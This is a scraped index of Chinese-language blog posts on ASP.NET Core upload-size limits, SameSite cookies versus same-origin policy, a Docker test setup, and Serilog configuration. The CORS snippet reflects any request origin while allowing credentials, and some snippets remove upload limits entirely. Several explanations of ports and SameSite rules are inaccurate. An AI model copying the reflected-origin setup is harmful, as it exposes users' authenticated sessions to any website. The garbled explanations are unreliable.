也要設定上限(MaxRequestBodySize) 預設的要求本文大小上限為 30,000,000 個位元組，大約是 28.6 MB。 //上傳文件大小限制Kestrel設置 services.Configure\u003cKestrelServerOptions\u003e(options =\u003e { // Set the limit to 256 MB options.Limits.MaxRequestBodySize = 268435456; }); //上傳文件大小限制IIS設置(下面這段可以不用複製) services.Configure\u003cIISServerOptions\u003e(options =\u003e { options.MaxRequestBodySize = long.Parse(Configuration.GetSection(\"Kestrel\").Value); }); 但是沒設定的話，會出現Request body too large 錯誤。 IISServerOptions我看這段很奇怪，使用上去沒有成功。後來看到: 獲取或設置 HttpRequest 的最大請求正文大小。請注意，IIS 本身俱有限制 maxAllowedContentLength，它將在 IISServerOptions 中設置的 MaxRequestBodySize 之前處理。更改 MaxRequestBodySize 不會影響 maxAllowedContentLength。要增加 maxAllowedContentLength，請在 web.config 中添加一個條目以將 maxAllowedContentLength 設置為更高的值。有關詳細信息，請參閱配置。 參考: AspNetCore.Docs/in-process-hosting.md at main · dotnet/AspNetCore.Docs ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:2","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"Request body too large 錯誤 Post的body大概超過30m就會報這個錯誤，完整的錯誤是Microsoft.AspNetCore.Server.Kestrel.Core.BadHttpRequestException: Request body too large 解決的方法有二種，一種是在請求的函數前加Attribute [HttpPost(\"upload\")] [RequestSizeLimit(100_000_000)] //最大100m左右 //[DisableRequestSizeLimit] //或者取消大小的限制 public async Task\u003cstring\u003e UploadFiles(ModelTest test) { 還有一種方法是全域增加請求body的大小或者不限body的大小。 public static IWebHost BuildWebHost(string[] args) { var config = new ConfigurationBuilder() .AddCommandLine(args) .Build(); return WebHost.CreateDefaultBuilder(args).UseConfiguration(config) .UseStartup\u003cStartup\u003e().UseKestrel(options =\u003e { //所有controller都不限制post的body大小 options.Limits.MaxRequestBodySize = null; }) .Build(); } ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:3","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"Multipart body length limit 134217728 exceeded錯誤 Post的body大概超過100多M會碰到這個錯誤，完整的錯誤資訊是 System.IO.InvalidDataException: Multipart body length limit 134217728 exceeded. 。 整體設定方法 解決的方法是在 startup.cs 新增程式碼： public void ConfigureServices(IServiceCollection services) { services.AddMvc(); //解決Multipart body length limit 134217728 exceeded services.Configure\u003cFormOptions\u003e(x =\u003e { x.ValueLengthLimit = int.MaxValue; x.MultipartBodyLengthLimit = int.MaxValue; // In case of multipart }); RequestFormLimitsAttribute 用來設定 MultipartBodyLengthLimit 單一頁面或動作的 。 單一頁面設定放法 這段程式碼的關鍵：requestLimits maxAllowedContentLength=“209715200” 。這句話的意思就是把允許上傳的最大檔案設定為200M。這個值，你們可以根據自己項目的需要實際設定。這裡，我們先暫時設定成200M。這時，我們再跑一下項目，會發現404錯誤已經不見了，取而代之的是另一種錯誤： 這段錯誤程式碼的意思是表單上傳的檔案長度超過了134217727KB，要解決這個問題，我們只有在Home控製器裡的Upload方法前加入如下屬性聲明：[RequestFormLimits(MultipartBodyLengthLimit = 209715200)] [HttpPost] [RequestFormLimits(MultipartBodyLengthLimit = 209715200)] public IActionResult Upload(IFormFile file, [FromServices] IHostingEnvironment env) { ... ... } 基本上使用 IIS 和 Kestrel 都需要設定的。 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:4","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"Nginx 限制上傳大小的錯誤 通過Nginx連接埠對應，請求會先經過Nginx，也需要額外再設定一個參數client_max_body_size，否則上傳大檔案也會有問題 location ^~ /sample2/ { rewrite ^/sample2/(.*)$ /$1 break; proxy_pass http://localhost:5556; client_max_body_size 300m; #最大接受300m檔案以內的 } ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:5","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"Kestrel 中的解決方案 如果你的程序時運行在 Kestrel 上，你可以在應用程式等級（整個系統）,或者是 Action 等級控制上傳檔案的大小。 你如果要在 Action 等級控制上傳檔案的大小，你需要設定兩個屬性[RequestSizeLimit] 和 [RequestFormLimits]. [RequestSizeLimit]屬性設定請求的最大長度（以位元組為單位），而[RequestFormLimits]設定多部分正文長度的最大長度。 [HttpPost] [RequestFormLimits(MultipartBodyLengthLimit = 209715200)] [RequestSizeLimit(209715200)] public IActionResult Upload(IFormFile file, [FromServices] IHostingEnvironment env) { ... ... } 想要全域設定 public static IWebHostBuilder CreateWebHostBuilder (string[] args) =\u003e WebHost.CreateDefaultBuilder(args) .UseStartup\u003cStartup\u003e() .UseKestrel(options =\u003e { options.Limits.MaxRequestBodySize = 209715200; }); 也需要設定 public void ConfigureServices(IServiceCollection services) { services.AddMvc(); services.Configure\u003cFormOptions\u003e(x =\u003e { x.MultipartBodyLengthLimit = 209715200; }); } ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:6","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"設定總結 光一個上傳檔案有這麼多選項，這邊做個整理，剛開始看也不知道差在哪邊。 用 IIS 通常會要設定 XML requestLimits maxAllowedContentLength，相關 MultipartBodyLengthLimit也要在程式設定。 用 Kestrel 一樣也要設定這些東西(MaxRequestBodySize、MaxRequestBodySize)，兩個都家都不會有影響。 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:7","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"其他相關文件(整理前參考) Asp.net core上传文件大小限制 - dashenxian .net core 上传文件大小限制 - CodeAntenna Serving video file / stream from ASP Net Core 6 Minimal API - Microsoft Q\u0026A [C#][ASP.NET] Web API 開發心得 (5) - 使用 Filter 統一 API 的回傳格式和例外處理 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 net core api上传下载大文件 413、400错误 IIS服务器 - wskxy - 博客园 [RequestFormLimits(MultipartBodyLengthLimit = 209715200)] [HttpPost(\"Up/{id}\")] 或 services.Configure\u003cIISServerOptions\u003e(options =\u003e { options.MaxRequestBodySize = 209715200; }); 參考:.net Core 解决Form value count limit 1024 exceeded. （文件上传过大） - Pursue - 博客园 怎流一個上傳檔案容量限制就有這麼多種設定方法。 在 ASP.NET Core MVC 使用 HTML5 實現多檔案上傳 - HackMD ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:8","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"彩蛋 ASP.NET Core 一行程式碼搞定檔案上傳-知識星球 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:3:0","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"環境變數 在 ASP.NET Core 中上传文件 - 掘金 Windows AppData\\Local\\Temp 暫存檔二三事-黑暗執行緒 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:3:1","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":["程式心法"],"content":"一般我們使用 Ajax 很長遇到跨域問題，之前我們很長設定 CORS 後端坐跨域設定結束這一回合。最近有研究 SSO 登入，有關 cookies 在不同子網域能不能做到 cookies 問題，原本覺得 cookies 是走 origin 的。結果後來發現 cookies 是走 SameSite ，我這邊就馬上惡補一下。結果發現有些東西很重要，但我竟然不知道，這邊簡單筆記一下。不過大致上你沒有要做到跨子網域登入一些東西可能就用不太到。 ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:0:0","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"推薦文章 忍術！把 same site 變 same origin 之術！ - Huli 備份圖 裡面寫滿多重點，文章範例比較攏長，不過幾乎規則都有提到。 SameSite小识 - 知乎 備份圖 上面文章看完可以看範例，比較能了解在講什麼 以上筆記從上面內容自己參考，真的上面內容都很完整，這邊簡單紀錄重點讓我方便回來複習。 ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:1:0","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"小記 ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:2:0","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"單字名詞意思 https://tw.yahoo.com:443 scheme scheme 中文翻譯叫 方案 。可參考scheme - Yahoo奇摩字典 搜尋結果 簡單就是https://tw.yahoo.com:443裡面的https。 常見的 https,http,ftp都是。 port 中文叫通訊協定，不過通常翻譯叫馬頭(港口)。 簡單就是https://tw.yahoo.com:443裡面的443。 host 中間那一串就是tw.yahoo.com。 Warning 下面 SameSite 和 Same Origin 是不一樣的，SameSite這邊比對 host 是指registrable domain。Same Origin 是指完整子網域。這邊在比對上一開始也是看不懂，下面有提到eTLD，相關去看如何判斷兩個網域的擁有者是否相同？ | 半熟前端了解規則就容易了解差異。 ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:2:1","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"SameSite Cookie Info 這邊原本 SameSite 標題，因為我看 SameSite 通常用在 Cookie 上面，MDN標題也叫 SameSite Cookie。參考這篇，但我下面還是用 SameSite 來說 SameSite 很多網站都說scheme + host。不看 port。 這邊很多網站沒有細提 host 這邊指的是 registrable domain。 其實這邊在我沒有仔細了解之前，我以為 domain 會抓憑證資訊或者是 xxxx.com.tw之類的 沒有想到是跟 eTLD有關係。可以看 如何判斷兩個網域的擁有者是否相同？ | 半熟前端 備份圖 網域的運作機制對於前端最大的意義在於 SameSite2 的判斷，我們想要知道兩個網站是否為 SameSite，因為在 SameSite 的情況下網站的 Cookie 是共享的（在沒有特別設定 header 的情況下）。 因此給定兩個網站 URL，kalan.hacker.com 跟 jack.hacker.com，請問這兩個 URL 是否為 SameSite？乍看之下兩個 URL 很像 hacker.com 的 subdomain，但看完剛剛的例子與說明，我們應該先看看 hacker.com 有沒有在 public suffix list 裡才能做判斷。 在 GitHub 當中，可以透過 Repository 的設定免費生成 xxx.github.io 的網域 ，像是我的舊部落格： kjj6198.github.io/blog 。在這種情況下，我們可不希望每個 xxx.github.io 的 cookie 都可以互相存取。對於這類型的應用來說，我們希望的是每個 xxx.github.io 都是一個獨立的網域，而不是 .github.io 的子網域，透過 eTLD 可以有效解決這個問題，查看 public suffix list 也確實可以找到 .github.io 的存在 其實看到這邊就還蠻驚訝的!!我用電腦這麼久都不知道有這麼有趣機制XD 這邊其實不是重點，我就不繼續興奮討論。 這邊看SameSite小識 - 知乎實戰 我們假設有一個名字為sessionId的cookie，domain 設置成了 .demo.com。 在 a.demo.com 域名下，ajax在該域名下的所有請求，都會自動帶上sessionId。 ajax.get(’/api/data’) // 自動帶上sessionId 在b.demo.com域名下，ajax在該域名下的所有請求，都會自動帶上sessionId。 ajax.post(’/api2/data2’) // 自動帶上sessionId 在b.demo.com域名下，ajax請求a.demo.com的api，需要設置withCredentials才能帶上sessionId ajax.get(‘https://a.demo.com/api/data') // 不能自動帶上sessionId ajax.get(‘https://a.demo.com/api/data', {withCredentials: true}) // 自動帶上sessionId 這邊我們可以看到在 request 訪問 a.demo.com 和 b.demo.com 都會傳送 主網域.demo.com cookies 資料。 瀏覽器 Demo 我直接用 Yahoo 新聞來看。開發者工具可以看到網站有用那些 cookies下圖。 在訪問https://tw.news.yahoo.com 會帶相關 cookies 但是在訪問非 https://tw.news.yahoo.com 網域 thamba因 domain 設定在 https://tw.news.yahoo.com，不會送出這組 cookies。參考下圖，我使用隨便不同子網域，並不回帶入thamba cookies。下面改成用Firefox，因為Chrome 404不會顯示傳什麼 cookies。 注意整體 cookies 並非一致設定，可以個別設定。 上面不是有提到 registrable domain 是使用 eTLD 關係查到。 Firefox 和 Edge 可以看出 registrable domain。 我們寫 cookies 進去通常有一個 domain 欄位，通常都不會帶。但瀏覽器不會隨便給你亂設定網域，這邊他會寫eTLD，除非你有寫正確子網域。我以前都不知道為什麼沒法修改 domain ，現在知道為什麼了。 ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:2:2","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"可能忽略 Cookies 跨域設定 參考: SameSite小識 - 知乎 我們常常前端串後端，因後端不同網域通常會後端加 router.get('/api/data', (ctx, next) =\u003e { ctx.set('Access-Control-Allow-Origin', ctx.headers.origin); ctx.set('Access-Control-Allow-Headers', 'Content-Type, Content-Length, Authorization, Accept, X-Requested-With , myheader'); ctx.set('Access-Control-Allow-Methods', 'PUT, POST, GET, DELETE, OPTIONS'); ctx.set('Access-Control-Allow-Credentials', 'true'); }; 但我們很少探討前端要怎麼跨域傳 cookies ，這邊還是傳送 SameSite喔 ajax.get('https://a.demo.com/api/data') // 不能自動帶上sessionId ajax.get('https://a.demo.com/api/data', {withCredentials: true}) // 自動帶上sessionId ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:2:3","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"SameSite 規則設定 SameSite可以有下面三種值： Strict僅允許一方請求攜帶Cookie，即瀏覽器將只發送相同站點請求的Cookie，即當前網頁URL與請求目標URL完全一致。 Lax允許部分第三方請求攜帶Cookie None無論是否跨站都會發送Cookie 通常程式沒指定，預設都是Lax。 Strict 只在 First-party 環境下帶上 Cookie，但這有個問題，假設使用者在 example.com 看到一條 FB 貼文連結（假設為 fb.com），就算使用者曾經登入過 fb.com 取得了 Cookie，點擊連結後因為兩個網站為 Cross-site，不會帶上 Cookie，只能看到登入頁面。 因此 Strict 適合用在操作，例如刪除貼文、付款等等。 參考:[Day 26] Cookies - SameSite Attribute - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 這邊簡單想就是從外站(包含子網域)連到主網站 cookies 會不會帶入問題，這邊我還沒實驗。但看到上面探討 CORS 安全性問題大概應該是這樣，目前還沒想到簡易實作。這邊我有簡單做個實作測試，可以參考簡單實作測試 SameSite 的規則(Lax,Strict,None) - 程式狂想筆記。 ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:2:4","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"跨域傳 cookies 需要 https SameSite=Strict：最嚴謹，只有與目前網頁網址一致才能發送 (remote.example、site.example 互相無法發送) Set-Cookie: CookieName=CookieValue; SameSite=Strict; SameSite=Lax：使用 GET remote.example 向 site.example 發送，Cookie 將會送向 remote.example (POST 則不會發送 Cookie) Set-Cookie: CookieName=CookieValue; SameSite=Lax; SameSite=None + HTTPS：允許跨網域存取，但是若沒 HTTPS 則預設「拒絕」跨網域存取 無效：Set-Cookie: remote_session=abc123; SameSite=None 有效：Set-Cookie: remote_session=abc123; SameSite=None; Secure 參考:PHP Cookie SameSite 的設定方式 – Tsung’s Blog 我要測試 http 想說怎麼Lax塞不進去，發現要 https ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:2:5","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"Same Origin Policy 建議可以看 簡單弄懂同源政策 (Same Origin Policy) 與跨網域 (CORS) | by Hannah Lin | Starbugs Weekly 星巴哥技術專欄 | Medium，因為這個我以前就很常遇到，所以就不仔細記錄。 檢查 scheme host (跟samesite 不一樣的是不看registrable domain，是整個子網域) port 比 SameSite 非常嚴格。 這邊簡單看 MDN給的判斷範例就一目瞭然。 這邊還是不知道差異嗎?這邊有比較可以參考 參考:忍術！把 same site 變 same origin 之術！ - Huli’s blog ","date":"2023-02-19","objectID":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/:3:0","tags":["samesite","origin"],"title":"SameSite Cookie 和 Same Origin Policy 是什麼","uri":"/blog/posts/SameSite-Cookie-%E5%92%8C-Same-Origin-Policy-%E6%98%AF%E4%BB%80%E9%BA%BC/"},{"categories":["程式心法"],"content":"因為測試 SameSite 需要用 https，要怎麼快速實作環境是一個重點。 ","date":"2023-02-19","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/:0:0","tags":["js","cookies","lax","strict"],"title":"簡單實作測試 SameSite 的規則(Lax,Strict,None)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/"},{"categories":["程式心法"],"content":"實作環境 #window docker run --rm -d -p 5001:80 -p 5002:80 -p 6001:443 -p 6002:443 --name my-apache-php-app -v %cd%:/var/www/html eboraas/apache-php #linux docker run --rm -d -p 5001:80 -p 5002:80 -p 6001:443 -p 6002:443 --name my-apache-php-app -v `pwd`:/var/www/html eboraas/apache-php http://localhsot:5001 http://localhsot:5002 https://localhsot:6001 https://localhsot:6002 還可以看hosts Windows 路徑在 C:\\Windows\\System32\\drivers\\etc Linux 路徑在 /etc/ # Added by Docker Desktop 192.168.1.115 host.docker.internal 192.168.1.115 gateway.docker.internal # To allow the same kube context to work on the host and the container: 127.0.0.1 kubernetes.docker.internal Docker Desktop 都幫我加上 host.docker.internal了，所以就加減用了。 http://host.docker.internal:5001 http://host.docker.internal:5002 https://host.docker.internal:6001 https://host.docker.internal:6002 這樣不同 port 和多網域一次完成。注意這邊都連到同一個 container。所以session都是吃一樣，所以到正式環境會連到不同環境機器，這點可能需要考慮到。通常會用 redis 之類去解決，不過也不是每個公司都有這樣環境，所以也需要考慮，這邊就不討論了。 ","date":"2023-02-19","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/:1:0","tags":["js","cookies","lax","strict"],"title":"簡單實作測試 SameSite 的規則(Lax,Strict,None)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/"},{"categories":["程式心法"],"content":"實作一個範例 SameSite 的 lax 需要用 https 才能存進去 client cookies。 https://localhost:6001/setcookies.php 會寫一筆 form.php 修改 method GET或 POST 進去 https://host.docker.internal:6001/form.php 查看執行結果 GET 會跑出cookies資料。 POST 會顯示空白頁面。 這有效防止 CORS 問題。 可以看這張圖測試。 Github: malagege/CookiesSameSiteDemo ","date":"2023-02-19","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/:2:0","tags":["js","cookies","lax","strict"],"title":"簡單實作測試 SameSite 的規則(Lax,Strict,None)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/"},{"categories":["程式心法"],"content":"心得 這麼簡單實作我們發現 Cookies 一些設定可以增加安全性，之前像我們後端做刪除文章功能，通常使用 POST，可能會說 GET 也能做到一樣的事情，但是 Lax 時候，就算從別的網站 Post 過來，使用者登入資訊 Cookies 不會加上到 Request 上面，可以預防這種事發生。 Info 這攻擊手法是CSRF。相關查詢可以Google或看這篇Chrome Cookie 政策調整與反思 | 魷型前端。 雖然現在前後端分離，最近在看這個可能沒有什麼用處。但在全端系統上，如何做到跨網域不重新登入，我覺得這個是滿重要議題。但最近很流行 OAuth 登入，有獨立做 Oauth Server也許也應用不到，基於技術好奇，我還是研究一下。 ","date":"2023-02-19","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/:3:0","tags":["js","cookies","lax","strict"],"title":"簡單實作測試 SameSite 的規則(Lax,Strict,None)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E6%B8%AC%E8%A9%A6-SameSite-%E7%9A%84%E8%A6%8F%E5%89%87-Lax-Strict-None/"},{"categories":[".Net Core"],"content":"我們公司使用 Serillog，這邊特別去看 Serillog 怎麼使用，這邊我自學的書是教使用 Nlog，下次有機會在筆記。 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:0:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"安裝 Serilog.AspNetCore 流程 參考官網: Getting Started · serilog/serilog Wiki 這邊還有分console,web設定，參考網頁選單下面內容參考。 Getting started Setting up a new console app Setting up a new web app 這邊以 Web 專案示範，參考 serilog/serilog-aspnetcore: Serilog integration for ASP.NET Core dotnet add package Serilog.AspNetCore 依賴性套件會有這些 Main 方法加入下面這段 using Serilog; using Serilog.Events; public class Program { public static int Main(string[] args) { Log.Logger = new LoggerConfiguration() .MinimumLevel.Override(\"Microsoft\", LogEventLevel.Information) .Enrich.FromLogContext() .WriteTo.Console() .CreateLogger(); try { Log.Information(\"Starting web host\"); CreateHostBuilder(args).Build().Run(); return 0; } catch (Exception ex) { Log.Fatal(ex, \"Host terminated unexpectedly\"); return 1; } finally { Log.CloseAndFlush(); } } 這邊注意原本有CreateHostBuilder(args).Build().Run();，因為這段上面方法就有包含，所以直接把這段換成上面就好。 在CreateHostBuilder加入UseSerilog public static IHostBuilder CreateHostBuilder(string[] args) =\u003e Host.CreateDefaultBuilder(args) .UseSerilog() // \u003c-- Add this line .ConfigureWebHostDefaults(webBuilder =\u003e { webBuilder.UseStartup\u003cStartup\u003e(); }); } 當然設定不可能只有這樣，官方有提供一些建議。 Remove the “Logging” section from appsettings.*.json files (this can be replaced with Serilog configuration as shown in the Sample project, if required) Remove UseApplicationInsights() (this can be replaced with the Serilog AI sink, if required) 找一些跟Application Insights相關的 Application Insights ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:1:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"增加日誌設定 安裝 Install-Package Serilog.Settings.Configuration 設定 appsetting.json { \"Serilog\": { \"Using\": [ \"Serilog.Sinks.Console\", \"Serilog.Sinks.File\" ], \"MinimumLevel\": \"Debug\", \"WriteTo\": [ { \"Name\": \"Console\" }, { \"Name\": \"File\", \"Args\": { \"path\": \"Logs/log.txt\" } } ], \"Enrich\": [ \"FromLogContext\", \"WithMachineName\", \"WithThreadId\" ], \"Destructure\": [ { \"Name\": \"With\", \"Args\": { \"policy\": \"Sample.CustomPolicy, Sample\" } }, { \"Name\": \"ToMaximumDepth\", \"Args\": { \"maximumDestructuringDepth\": 4 } }, { \"Name\": \"ToMaximumStringLength\", \"Args\": { \"maximumStringLength\": 100 } }, { \"Name\": \"ToMaximumCollectionCount\", \"Args\": { \"maximumCollectionCount\": 10 } } ], \"Properties\": { \"Application\": \"Sample\" } } } 可以參考官網範例serilog/serilog-settings-configuration: A Serilog configuration provider that reads from Microsoft.Extensions.Configuration 這邊我通常不會寫那麼多 \"Serilog\": { \"MinimumLevel\": { \"Default\": \"Information\", \"Override\": { \"Microsoft\": \"Warning\", \"System\": \"Warning\" } } }, rollOnFileSizeLimit value is not being used · Issue #184 · serilog/serilog-settings-configuration 不過我找不到 rolllog方法，最後找到rollingInterval可以做到，使用字串就能套用變數 { \"Serilog\": { \"MinimumLevel\": { \"Default\": \"Information\", \"Override\": { \"Microsoft\": \"Information\", \"System\": \"Warning\" } }, \"Enrich\": [ \"FromLogContext\" ], \"WriteTo\": [ { \"Name\": \"Console\" }, { \"Name\": \"File\", \"Args\": { \"path\": \"Logs/log-.txt\", \"rollingInterval\": \"Day\", \"outputTemplate\": \"{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level}] ({SourceContext}.{Method}) {Message}{NewLine}{Exception}\" } } ] } 最後程式改寫如下，主要看Main方法這邊region public class Program { public static int Main(string[] args) { #region 這邊 var configuration = new ConfigurationBuilder() .SetBasePath(Directory.GetCurrentDirectory()) 